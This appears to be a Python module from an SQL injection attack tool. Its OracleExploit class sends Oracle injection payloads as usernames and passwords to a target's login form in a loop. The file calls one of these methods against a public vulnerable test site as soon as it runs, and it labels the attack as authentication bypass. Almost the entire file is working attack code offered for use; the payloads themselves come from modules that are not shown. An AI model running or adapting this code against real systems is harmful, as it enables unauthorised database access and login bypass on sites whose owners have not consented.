import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
import sys
import os
import logging
import random

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import SQLJNG_result_report
from lib.result.Results import safe_SQLJNG_result
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from lib.SQLJNGDataTypes.Magicdicts import magic_dict
from lib.Attacktype.Attacks import HeaderAttacks
from logger.sqljlog import logger as sqljlog
from lib.OracleSQLinjection.oraclepayloads import OraclePayloads
from lib.regelexpression.extractparameter import extract_parameter_name
from INFO.common import columns
from INFO.common import tables

attack_type = "authentication bypass SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads
              """

"""Reference for the header inspiration:
https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url """

"""This is When we want to attack with decoy and use spoofing """

"""Tested against: http://testfire.net/login.jsp """





__harmfull__ = HARMFULL.MEDIUM
__priority__ = PRIORITY.HIGH







pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}






class OracleExploit:
    @staticmethod 
    def Hostname_Attack(urls):
        parameter,_ = extract_parameter_name(urls)
        payload = OraclePayloads.Host_name_oracle(viewcolumn=random.choice(columns),hostname=parameter,table=random.choice(tables))
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    
    @staticmethod
    def db_column_exploit(urls):
        payload = OraclePayloads.db_column_list("id","column","table")
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    @staticmethod 
    def db_column_list_exploit(urls):
        payload = OraclePayloads.db_column_list("id","column","table")
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    @staticmethod
    def oracle_injection_exploit(urls):
        payload = OraclePayloads.oracle_injection_payload("id","column","table")
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    @staticmethod
    def oracle_injection_database_list_attack(urls):
        payload = OraclePayloads.oracle_injection_database_list("id","column","table")
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")


OracleExploit.Hostname_Attack("http://testphp.vulnweb.com/artists.php?artist=1")